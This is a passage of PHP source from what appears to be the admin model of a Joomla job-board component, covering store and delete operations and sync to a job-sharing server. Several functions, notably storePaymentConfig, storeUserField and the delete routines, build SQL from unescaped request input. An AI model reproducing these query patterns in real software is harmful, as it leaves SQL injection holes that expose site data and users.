                $server_salaryrange_data['rangeend'] = $row->rangeend;
                $server_salaryrange_data['serverid'] = $row->serverid;
                $server_salaryrange_data['authkey'] = $this->_client_auth_key;
                $table = "salaryrange";
                $jobsharing = new JSJobsModelJobSharing;

                $return_value = $jobsharing->storeDefaultTables($server_salaryrange_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeSalaryRangeType() {
            $row = & $this->getTable('salaryrangetype');
            $returnvalue = 1;
            $data = JRequest :: get('post');

            if ($data['id'] == '') { // only for new
                $result = $this->isSalaryRangeTypeExist($data['title']);
                if ($result == true) {
                    $returnvalue = 3;
                }
            }
            if ($returnvalue == 1) {
                if (!$row->bind($data)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$row->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            $server_salaryrangetype_data = array();
            if ($this->_client_auth_key != "") {
                $server_salaryrangetype_data['id'] = $row->id;
                $server_salaryrangetype_data['title'] = $row->title;
                $server_salaryrangetype_data['status'] = $row->status;
                $server_salaryrangetype_data['serverid'] = $row->serverid;
                $server_salaryrangetype_data['authkey'] = $this->_client_auth_key;
                $table = "salaryrangetypes";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_salaryrangetype_data, $table);
                $return_value['issharing'] = 1;
                $return_value[2] = $row->id;
            } else {
                $return_value['issharing'] = 0;
                $return_value[1] = $returnvalue;
                $return_value[2] = $row->id;
            }
            return $return_value;
        }

        function storeRole() {
            $row = & $this->getTable('role');
            $data = JRequest :: get('post');
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->check()) {
                $this->setError($this->_db->getErrorMsg());
                return 2;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }

            return true;
        }

        function storeUserRole() {
            $row = & $this->getTable('userrole');
            $data = JRequest :: get('post');
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->check()) {
                $this->setError($this->_db->getErrorMsg());
                return 2;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }

            return true;
        }

        function storeResumeUserFields() {
            $db = & JFactory::getDBO();
            $data = JRequest :: get('post');
            $fieldvaluerow = & $this->getTable('fieldsordering');

            $userfields = $data['userfield'];
            $titles = $data['title'];
            $fieldfor = $data['fieldfor'];
            $publisheds = $data['published'];
            $requireds = $data['required'];
            $id = $data['id'];
            for ($i = 0; $i <= 9; $i++) {

                $fieldvaluedata = array();
                $fieldvaluedata['id'] = $id[$i];
                $fieldvaluedata['field'] = $userfields[$i];
                
                $fieldvaluedata['fieldtitle'] = $titles[$i];
                $fieldvaluedata['ordering'] = 21 + $i;
                $fieldvaluedata['section'] = 1000;
                $fieldvaluedata['fieldfor'] = $fieldfor;
                $fieldvaluedata['published'] = $publisheds[$i];
                $fieldvaluedata['sys'] = 0;
                $fieldvaluedata['cannotunpublish'] = 0;
                $fieldvaluedata['required'] = $requireds[$i];

                if (!$fieldvaluerow->bind($fieldvaluedata)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$fieldvaluerow->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            return true;
        }

        function storeUserField() {
            $db = & JFactory::getDBO();
            $row = & $this->getTable('userfield');
            $data = JRequest :: get('post');

            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->check()) {
                $this->setError($this->_db->getErrorMsg());
                return 2;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            // add in field ordering
            if ($data['id'] == '') { // only for new
                if ($data['fieldfor'] == 3) {
                    $query = "INSERT INTO #__js_job_fieldsordering
						(field, fieldtitle, ordering, section, fieldfor, published, sys, cannotunpublish)
						VALUES(" . $row->id . ",'" . $data['title'] . "', ( SELECT max(ordering)+1 FROM #__js_job_fieldsordering AS field WHERE fieldfor = " . $data['fieldfor'] . "),1000
						, " . $data['fieldfor'] . "," . $data['published'] . " ,0,0)
				";
                } else {
                    $query = "INSERT INTO #__js_job_fieldsordering
						(field, fieldtitle, ordering, section, fieldfor, published, sys, cannotunpublish)
						VALUES(" . $row->id . ",'" . $data['title'] . "', ( SELECT max(ordering)+1 FROM #__js_job_fieldsordering AS field WHERE fieldfor = " . $data['fieldfor'] . "), ''
						, " . $data['fieldfor'] . "," . $data['published'] . " ,0,0)
				";
                }
                $db->setQuery($query);
                if (!$db->query()) {
                    return false;
                }
            }
            // store values
            $ids = $data['jsIds'];
            $names = $data['jsNames'];
            $values = $data['jsValues'];
            $fieldvaluerow = $this->getTable('userfieldvalue');
            for ($i = 0; $i <= $data['valueCount']; $i++) {
                $fieldvaluedata = array();
                if (isset($ids[$i]))
                    $fieldvaluedata['id'] = $ids[$i];
                else
                    $fieldvaluedata['id'] = '';
                $fieldvaluedata['field'] = $row->id;
                $fieldvaluedata['fieldtitle'] = $names[$i];
                $fieldvaluedata['fieldvalue'] = $values[$i];
                $fieldvaluedata['ordering'] = $i + 1;
                $fieldvaluedata['sys'] = 0;
                if (!$fieldvaluerow->bind($fieldvaluedata)) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
                if (!$fieldvaluerow->store()) {
                    $this->setError($this->_db->getErrorMsg());
                    return false;
                }
            }
            return true;
        }

        function storeConfig() {
            $row = & $this->getTable('config');
            $data = JRequest :: get('post');
            $config = array();
            if ($data['notgeneralbuttonsubmit'] != 1) {
                if (!isset($data['employer_share_fb_like']))
                    $data['employer_share_fb_like'] = 0;
                if (!isset($data['jobseeker_share_fb_like']))
                    $data['jobseeker_share_fb_like'] = 0;
                if (!isset($data['employer_share_fb_share']))
                    $data['employer_share_fb_share'] = 0;
                if (!isset($data['jobseeker_share_fb_share']))
                    $data['jobseeker_share_fb_share'] = 0;
                if (!isset($data['employer_share_fb_comments']))
                    $data['employer_share_fb_comments'] = 0;
                if (!isset($data['jobseeker_share_fb_comments']))
                    $data['jobseeker_share_fb_comments'] = 0;
                if (!isset($data['employer_share_google_like']))
                    $data['employer_share_google_like'] = 0;
                if (!isset($data['jobseeker_share_google_like']))
                    $data['jobseeker_share_google_like'] = 0;
                if (!isset($data['employer_share_google_share']))
                    $data['employer_share_google_share'] = 0;
                if (!isset($data['jobseeker_share_google_share']))
                    $data['jobseeker_share_google_share'] = 0;
                if (!isset($data['employer_share_blog_share']))
                    $data['employer_share_blog_share'] = 0;
                if (!isset($data['jobseeker_share_blog_share']))
                    $data['jobseeker_share_blog_share'] = 0;
                if (!isset($data['employer_share_friendfeed_share']))
                    $data['employer_share_friendfeed_share'] = 0;
                if (!isset($data['jobseeker_share_friendfeed_share']))
                    $data['jobseeker_share_friendfeed_share'] = 0;
                if (!isset($data['employer_share_linkedin_share']))
                    $data['employer_share_linkedin_share'] = 0;
                if (!isset($data['jobseeker_share_linkedin_share']))
                    $data['jobseeker_share_linkedin_share'] = 0;
                if (!isset($data['employer_share_digg_share']))
                    $data['employer_share_digg_share'] = 0;
                if (!isset($data['jobseeker_share_digg_share']))
                    $data['jobseeker_share_digg_share'] = 0;
                if (!isset($data['employer_share_twitter_share']))
                    $data['employer_share_twitter_share'] = 0;
                if (!isset($data['jobseeker_share_twiiter_share']))
                    $data['jobseeker_share_twiiter_share'] = 0;
                if (!isset($data['employer_share_myspace_share']))
                    $data['employer_share_myspace_share'] = 0;
                if (!isset($data['jobseeker_share_myspace_share']))
                    $data['jobseeker_share_myspace_share'] = 0;
                if (!isset($data['employer_share_yahoo_share']))
                    $data['employer_share_yahoo_share'] = 0;
                if (!isset($data['jobseeker_share_yahoo_share']))
                    $data['jobseeker_share_yahoo_share'] = 0;
            }
            $db = $this->getDbo();
            foreach ($data as $key => $value) {
                $query = "UPDATE `#__js_job_config` SET `configvalue` = " . $db->quote($value) . " WHERE `configname` = " . $db->quote($key) . ";";
                $db->setQuery($query);
                $db->query();
            }

            return true;
        }

        function storePaymentConfig() {
            $row = & $this->getTable('paymentmethodconfig');
            $data = JRequest :: get('post');
            $config = array();
            if (!isset($data['showname_westernunion']))
                $data['showname_westernunion'] = 0;
            if (!isset($data['showcountryname_westernunion']))
                $data['showcountryname_westernunion'] = 0;
            if (!isset($data['showcityname_westernunion']))
                $data['showcityname_westernunion'] = 0;
            if (!isset($data['showaccountinfo_westernunion']))
                $data['showaccountinfo_westernunion'] = 0;

            $db = JFactory::getDbo();
            foreach ($data as $key => $value) {
                $query = "UPDATE `#__js_job_paymentmethodconfig` SET `configvalue` = '" . $value . "' WHERE `configname` = '" . $key . "';";
                $db->setQuery($query);
                $db->query();
            }
            return true;
        }

        function storeEmailTemplate() {
            $row = & $this->getTable('emailtemplate');

            $data = JRequest :: get('post');
            $data['body'] = JRequest::getVar('body', '', 'post', 'string', JREQUEST_ALLOWRAW);

            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }

            return true;
        }

        function storeCountry() {
            $row = & $this->getTable('country');
            $data = JRequest :: get('post');
            $data['shortCountry'] = str_replace(' ', '-', $data['name']);

            if ($data['id'] == '') { // only for new
                $existvalue = $this->isCountryExist($data['name']);
                if ($existvalue == true)
                    return 3;
            }
            if (!$row->bind($data)) {
                echo $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                echo $this->setError($this->_db->getErrorMsg());
                return false;
            }

            $server_country_data = array();
            if ($this->_client_auth_key != "") {
                $server_country_data['id'] = $row->id;
                $server_country_data['shortCountry'] = $row->shortCountry;
                $server_country_data['continentID'] = $row->continentID;
                $server_country_data['dialCode'] = $row->dialCode;
                $server_country_data['name'] = $row->name;
                $server_country_data['enabled'] = $row->enabled;
                $server_country_data['serverid'] = $row->serverid;
                $server_country_data['authkey'] = $this->_client_auth_key;
                $table = "countries";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_country_data, $table);
                return $return_value;
            } else {
                return true;
            }
        }

        function storeState($countryid) {
            $row = & $this->getTable('state');
            $db = &$this->getDBO();
            $data = JRequest :: get('post');
            $data['countryid'] = $countryid;

            if (!$data['id']) { // only for new
                $existvalue = $this->isStateExist($data['name'], $data['countryid']);
                if ($existvalue == true)
                    return 3;
                $data['shortRegion'] = $data['name'];
            }
            else
                $data['shortRegion'] = $data['name'];
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            $server_state_data = array();
            if ($this->_client_auth_key != "") {
                $server_state_data['id'] = $row->id;
                $server_state_data['shortRegion'] = $row->shortRegion;
                $server_state_data['name'] = $row->name;
                $server_state_data['enabled'] = $row->enabled;
                $server_state_data['countryid'] = $row->countryid;
                $server_state_data['serverid'] = $row->serverid;
                $server_state_data['authkey'] = $this->_client_auth_key;
                if ($data['countryid']) {
                    $query = "SELECT serverid FROM `#__js_job_countries` WHERE   id = " . $data['countryid'];
                    $db->setQuery($query);
                    $country_serverid = $db->loadResult();
                    if ($country_serverid)
                        $server_state_data['countryid'] = $country_serverid;
                    else
                        $server_state_data['countryid'] = 0;
                }
                else
                    $server_state_data['countryid'] = 0;
                $table = "states";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_state_data, $table);
                return $return_value;
            }else {
                return true;
            }
        }

        function storeCity($countryid, $stateid) {
            $row = & $this->getTable('city');
            $db = &$this->getDBO();
            $data = JRequest :: get('post');
            $data['countryid'] = $countryid;
            $data['stateid'] = $stateid;
            $data['cityName'] = $data['name'];

            if (!$data['id']) { // only for new
                $existvalue = $this->isCityExist($countryid, $stateid, $data['name']);
                if ($existvalue == true)
                    return 3;
                $row->isedit = 1;
            }

            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$data['id'])
                $row->code = $code;
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            $server_city_data = array();
            if ($this->_client_auth_key != "") {
                $server_city_data['id'] = $row->id;
                $server_city_data['cityName'] = $row->cityName;
                $server_city_data['name'] = $row->name;
                $server_city_data['enabled'] = $row->enabled;
                $server_city_data['serverid'] = $row->serverid;
                $server_city_data['authkey'] = $this->_client_auth_key;
                if ($data['countryid']) {
                    $query = "SELECT serverid FROM `#__js_job_countries` WHERE   id = " . $data['countryid'];
                    $db->setQuery($query);
                    $country_serverid = $db->loadResult();
                    if ($country_serverid)
                        $server_city_data['countryid'] = $country_serverid;
                    else
                        $server_city_data['countryid'] = 0;
                }
                else
                    $server_city_data['countryid'] = 0;
                if ($data['stateid']) {
                    $query = "SELECT serverid FROM `#__js_job_states` WHERE   id = " . $data['stateid'];
                    $db->setQuery($query);
                    $state_serverid = $db->loadResult();
                    if ($state_serverid)
                        $server_city_data['stateid'] = $state_serverid;
                    else
                        $server_city_data['stateid'] = 0;
                }
                else
                    $server_city_data['stateid'] = 0;
                $table = "cities";
                $jobsharing = new JSJobsModelJobSharing;
                $return_value = $jobsharing->storeDefaultTables($server_city_data, $table);
                return $return_value;
            }else {
                return true;
            }
        }

        function storeMessage() {
            $db = &$this->getDBO();
            $data = JRequest :: get('post');
            $row = &$this->getTable('message');
            if (!$row->bind($data)) {
                $this->setError($this->_db->getErrorMsg());
                return false;
            }
            if (!$row->check()) {
                $this->setError($this->_db->getErrorMsg());
                return 2;
            }
            if (!$row->store()) {
                $this->setError($this->_db->getErrorMsg());
                echo $this->_db->getErrorMsg();
                return false;
            }
            if ($this->_client_auth_key != "") {
                $query = "SELECT serverid FROM #__js_job_jobs
				WHERE  id = " . $data['jobid'];
                $db->setQuery($query);
                $server_jobid = $db->loadResult();
                $data['jobid'] = $server_jobid;
                $query = "SELECT serverid FROM #__js_job_resume
				WHERE   id= " . $data['resumeid'];
                $db->setQuery($query);
                $server_resumeid = $db->loadResult();
                $query = "SELECT serverid FROM #__js_job_messages
				WHERE   id= " . $data['id'];
                $db->setQuery($query);
                $server_messageid = $db->loadResult();
                $data['id'] = $server_messageid;
                $data['resumeid'] = $server_resumeid;
                $data['message_id'] = $row->id;
                $data['sendby'] = $row->sendby;
                $data['replytoid'] = $row->replytoid;
                $data['isread'] = $row->isread;
                $data['status'] = $row->status;
                $data['authkey'] = $this->_client_auth_key;
                $data['task'] = 'storemessage';
                $isownresumemessage = 1;
                $data['isownresumemessage'] = $isownresumemessage;
                $jsjobsharingobject = new JSJobsModelJobSharing;
                $return_value = $jsjobsharingobject->storeMessageSharing($data);
                return $return_value;
            } else {
                if ($row->status == 1)
                    return true;
                elseif ($row->status == 0)
                    return 2;
            }
        }

	function deleteFolder(){ //delete Messages
        $db = &$this->getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('folder');
        $deleteall = 1;
        foreach ($cids as $cid) {
			$euid = 0; // employer uid
			$serverfolderid = 0;
			if ($this->_client_auth_key != '') {
				$query = "SELECT folder.serverid AS id,folder.uid AS uid FROM `#__js_job_folders` AS folder WHERE folder.id = " . $cid;
				$db->setQuery($query);
				$data = $db->loadObject();
				$serverfolderid = $data->id;
				$euid = $data->uid;
			}
			
            if ($this->folderCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
				if ($serverfolderid != 0) {
					$data = array();
					$data['id'] = $serverfolderid;
					$data['referenceid'] = $cid;
					$data['uid'] = $euid;
					$data['authkey'] = $this->_client_auth_key;
					$data['siteurl'] = $this->_siteurl;
					$data['task'] = 'deletefolder';
					$jsjobsharingobject = new JSJobsModelJobSharing;
					$return_value = $jsjobsharingobject->deleteFolderSharing($data);
					return $return_value;
				}
                
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function folderCanDelete($id) {
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        
        $query = "SELECT COUNT(id) AS total FROM `#__js_job_folders` WHERE  id = " . $id;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return true;
        else
            return false;
    }

    function deleteMessages() {
        $db = &$this->getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('message');
        $deleteall = 1;
        foreach ($cids as $cid) {
			$servermessageid = 0;
			if ($this->_client_auth_key != "") {
				$query = "SELECT message.serverid AS id FROM `#__js_job_messages` AS message WHERE message.id = " . $cid;
				$db->setQuery($query);
				$s_m_id = $db->loadResult();
				$servermessageid = $s_m_id;
			}
			
            if ($this->messageCanDelete($cid) == true) {

                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
				if ($servermessageid != 0) {
					$data = array();
					$data['id'] = $servermessageid;
					$data['referenceid'] = $cid;
					$data['uid'] = $this->_uid;
					$data['authkey'] = $this->_client_auth_key;
					$data['siteurl'] = $this->_siteurl;
					$data['task'] = 'deletemessage';
					$jsjobsharingobject = new JSJobsModelJobSharing;
					$return_value = $jsjobsharingobject->deleteMessageSharing($data);
					return $return_value;
				}
                
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function messageCanDelete($id) {
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT COUNT(id) AS total FROM `#__js_job_messages` WHERE  id= " . $id;

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return true;
        else
            return false;
    }

    function deleteEmployerPackage() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('employerpackage');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->employerPackageCanDelete($cid) == true) {

                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function employerPackageCanDelete($id) {
		
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT COUNT(id) FROM `#__js_job_paymenthistory` WHERE packageid = " . $id . " AND packagefor=1 ";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function deleteCompany() {
        $db = & JFactory::getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('company');
        $deleteall = 1;
        foreach ($cids as $cid) {
			$servercompanyid=0;
			if ($this->_client_auth_key != "") {
				$query = "SELECT company.serverid AS serverid FROM `#__js_job_companies` AS company  WHERE company.id = " . $cid;
				$db->setQuery($query);
				$c_s_id = $db->loadResult();
				if ($c_s_id)
					$servercompanyid = $c_s_id;
			}
            if ($this->companyCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
				$query = "DELETE FROM `#__js_job_companycities` WHERE companyid = " . $cid;
				$db->setQuery($query);
				if (!$db->query()) {
					return false;
				}
				$this->deleteUserFieldData($cid);
				if ($servercompanyid != 0) {
					$data = array();
					$data['id'] = $servercompanyid;
					$data['referenceid'] = $cid;
					$data['uid'] = $this->_uid;
					$data['authkey'] = $this->_client_auth_key;
					$data['siteurl'] = $this->_siteurl;
					$data['task'] = 'deletecompany';
					$jsjobsharingobject = new JSJobsModelJobSharing;
					$return_value = $jsjobsharingobject->deleteCompanySharing($data);
					return $return_value;
				}
                
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }
    function deleteUserFieldData($refid) { //delete user field data
        $db = & JFactory::getDBO();

        $query = "DELETE FROM #__js_job_userfield_data WHERE referenceid = " . $refid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }
    function deleteDepartment() {
        $db = & JFactory::getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('department');
        $deleteall = 1;
        foreach ($cids as $cid) {
			$serverdepartmentid = 0;
			if ($this->_client_auth_key != "") {
				$query = "SELECT dep.serverid AS id FROM `#__js_job_departments` AS dep  
							WHERE dep.id = " . $cid;
				$db->setQuery($query);
				$s_dep_id = $db->loadResult();
				$serverdepartmentid = $s_dep_id;
			}
            if ($this->departmentCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
				if ($serverdepartmentid != 0) {
					$data = array();
					$data['id'] = $serverdepartmentid;
					$data['referenceid'] = $cid;
					$data['uid'] = $this->_uid;
					$data['authkey'] = $this->_client_auth_key;
					$data['siteurl'] = $this->_siteurl;
					$data['task'] = 'deletedepartment';
					$jsjobsharingobject = new JSJobsModelJobSharing;
					$return_value = $jsjobsharingobject->deleteDepartmentSharing($data);
					return $return_value;
				}
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteJob() {
        $db = & JFactory::getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('job');
        $deleteall = 1;
        foreach ($cids as $cid) {
			$serverjodid = 0;
            if ($this->_client_auth_key != "") {
                $query = "SELECT job.serverid AS id FROM `#__js_job_jobs` AS job WHERE job.id = " . $cid;
                $db->setQuery($query);
                $s_job_id = $db->loadResult();
                $serverjodid = $s_job_id;
            }
            if ($this->jobCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
				$query = "DELETE FROM `#__js_job_jobcities` WHERE jobid = " . $cid;
				$db->setQuery($query);
				if (!$db->query()) {
					return false;
				}
                $this->deleteUserFieldData($cid);
				if ($serverjodid != 0) {
					$data = array();
					$data['id'] = $serverjodid;
					$data['referenceid'] = $cid;
					$data['uid'] = $this->_uid;
					$data['authkey'] = $this->_client_auth_key;
					$data['siteurl'] = $this->_siteurl;
					$data['task'] = 'deletejob';
					$jsjobsharingobject = new JSJobsModelJobSharing;
					$return_value = $jsjobsharingobject->deleteJobSharing($data);
					$employer = $this->getEmployerModel();
					$employer->updateJobTemp();
					return $return_value;
				}
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteResume() {
        $db = &$this->getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('resume');
        $deleteall = 1;
        foreach ($cids as $cid) {
			$juid = 0; // jobseeker uid
			$serverresumeid = 0;
			if ($this->_client_auth_key != "") {
				$query = "SELECT resume.serverid AS id,resume.uid AS uid FROM `#__js_job_resume` AS resume WHERE resume.id = " . $cid;
				$db->setQuery($query);
				$data = $db->loadObject();
				$serverresumeid = $data->id;
				$juid = $data->uid;
			}
            if ($this->resumeCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
				$this->deleteUserFieldData($cid);
				if ($serverresumeid != 0) {
					$data = array();
					$data['id'] = $serverresumeid;
					$data['referenceid'] = $cid;
					$data['uid'] = $juid;
					$data['authkey'] = $this->_client_auth_key;
					$data['siteurl'] = $this->_siteurl;
					$data['task'] = 'deleteresume';
					$jsjobsharingobject = new JSJobsModelJobSharing;
					$return_value = $jsjobsharingobject->deleteResumeSharing($data);
					return $return_value;
				}
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteEmpApp() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('empapp');

        foreach ($cids as $cid) {
            if (!$row->delete($cid)) {
                $this->setError($row->getErrorMsg());
                return false;
            }
        }

        return true;
    }

    function deleteCategory() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('category');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->categoryCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteSubCategory() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('subcategory');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->subCategoryCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteCategoryAndSubcategory() {

        $db = &$this->getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('category');
        $row1 = & $this->getTable('subcategory');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->checkCategoryCanDelete($cid) == true) {
                $query = "SELECT id FROM `#__js_job_subcategories` WHERE categoryid  = " . $cid;

                $db->setQuery($query);
                $subcategory = $db->loadObjectList();
                foreach ($subcategory as $subcat) {
                    if ($this->subCategoryCanDelete($subcat->id) == true) {
                        if (!$row1->delete($subcat->id)) {
                            $this->setError($row1->getErrorMsg());
                            return false;
                        }
                    }
                }
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function checkCategoryCanDelete($categoryid) {  // for delete category and subcategory
        if (is_numeric($categoryid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_companies` WHERE category = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE jobcategory = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE job_category = " . $categoryid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function deleteJobType() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('jobtype');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->jobTypeCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteAge() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('ages');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->ageCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteCurrency() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('currency');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->currencyCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteCareerLevel() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('careerlevel');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->careerLevelCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteExperience() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('experience');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->experienceCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteJobStatus() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('jobstatus');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->jobStatusCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteShift() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('shift');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->shiftCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteHighestEducation() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('highesteducation');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->highestEducationCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteSalaryRange() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('salaryrange');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->salaryRangeCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteSalaryRangeType() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('salaryrangetype');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->salaryRangeTypeCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteRole() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('role');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->roleCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteUserField() {
